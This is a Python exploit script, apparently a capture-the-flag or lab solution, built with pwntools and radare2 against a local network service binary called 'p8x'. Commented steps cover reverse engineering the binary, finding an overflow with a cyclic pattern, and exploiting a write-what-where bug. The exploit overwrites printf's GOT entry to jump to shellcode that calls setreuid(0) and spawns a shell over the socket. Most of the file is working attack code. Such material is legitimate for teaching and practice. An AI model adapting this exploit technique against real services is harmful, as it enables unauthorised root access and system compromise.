from pwn import *
import r2pipe
import os
from time import sleep

log.info("Opening up the binary with r2 and performing analyses")
r2 = r2pipe.open("p8x")
r2.cmd("e scr.color=true")
r2.cmd("aaaa")

print(r2.cmd("iY"))
print(r2.cmd("iz"))
print(r2.cmd("is"))

log.info("Disassembling main")
print(r2.cmd("pdf@main"))

log.info("Odd. Main is... dreadfully short. Let's cross-ref the 'Here is the message' string we saw earlier.")
r2.cmd("s 0x08048e76")
print(r2.cmd("axt"))

log.info("OK, this looks promising. Let's see if we can find a function tied to this instruction.")
print(r2.cmd("pdf@0x8048c52"))

log.info("Bingo. The function that has what we want is sub.socket_863. Let's see this graphically.")
r2.cmd("s sub.socket_863")
print(r2.cmd("agf"))

log.info("""0x80488bf does the binding here. not particularly interesting for us at this point.
Looks like the addresses with the interesting stuff are 0x80489d8 and 0x8048bf6. 
0x80489d8 Accepts user input.""")
print(r2.cmd("pdf@sub.socket_863~malloc"))

log.info("Let's start playing with the binary. We're running the bin with gdb.")
server = process(["gdb", "./p8x"])
server.sendline("r 12347")
print(server.recv())
sleep(1)
p8x = remote("127.0.0.1", 12347)
p8x.clean()
p8x.send("a" * 0x220 + cyclic(32))
print(server.recv())
try:
    print(p8x.recv(timeout=5))
except Exception:
    log.info("Ooo. Segfault here. Address: 0x61616163")
p8x.close()
server.close()

offset = cyclic_find(p32(0x61616163)) + 0x220

# The instruction that cacks is: mov dword [edx], eax
# eax --> 0x61616161
# edx --> 0x62626262
# Whoa, wait. This means that we have a write what where opportunity!
# Hmmm. printf gets called later in the program, right? So what if we overwrote the got so that
# printf points to a payload we upload in the heap?
# For this, we need to know the address for the system function. Let's see.

log.info("Get the address of printf in the got")
p8x_elf = ELF("p8x")
printf_address = p8x_elf.got["printf"]
addresses = gdb.find_module_addresses("p8x")

log.info("Assembling a payload")
#This one is nice: does a nice little reverse number on the server.
payload = asm(shellcraft.setreuid(0) + shellcraft.findpeersh())
payload_address = 0x080487a1 # Little trampoline to eax. Adds 8 to al and then calls eax.

log.info("Sending payload to server")
p8x = remote("127.0.0.1", 12345)
p8x.clean()
padding = offset - 4 - len(payload)
p8x.send(p32(payload_address) + "\x90" * padding + payload + p32(printf_address))
p8x.interactive()
